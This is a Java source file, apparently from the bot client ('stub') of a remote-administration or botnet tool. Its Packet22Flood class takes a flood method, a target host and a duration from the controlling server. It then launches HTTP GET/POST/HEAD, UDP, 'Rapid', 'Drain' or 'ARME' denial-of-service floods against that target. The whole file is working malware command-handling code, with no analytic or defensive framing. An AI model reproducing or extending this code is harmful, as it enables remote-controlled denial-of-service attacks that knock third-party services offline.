package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.stub.Connection;
import com.redpois0n.stub.Constants;
import com.redpois0n.stub.flood.ARME;
import com.redpois0n.stub.flood.Drain;
import com.redpois0n.stub.flood.HTTP;
import com.redpois0n.stub.flood.Rapid;
import com.redpois0n.stub.flood.ThreadFlood;
import com.redpois0n.stub.flood.UDP;

public class Packet22Flood extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String method = Connection.readLine();
		String target = Connection.readLine();
		int seconds = Connection.readInt();
		
		new ThreadFlood(seconds).start();
				
		if (method.equals("HTTPGET")) {
			new HTTP(target, Constants.HTTP_GET).start();
		} else if (method.equals("HTTPPOST")) {
			new HTTP(target, Constants.HTTP_POST).start();
		} else if (method.equals("HTTPHEAD")) {
			new HTTP(target, Constants.HTTP_HEAD).start();
		} else if (method.equals("UDP")) {
			new UDP(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
		} else if (method.equals("RAPID")) {
			new Rapid(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
		} else if (method.equals("DRAIN")) {
			new Drain(target).start();
		} else if (method.equals("ARME")) {
			new ARME(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
		}
	}

}
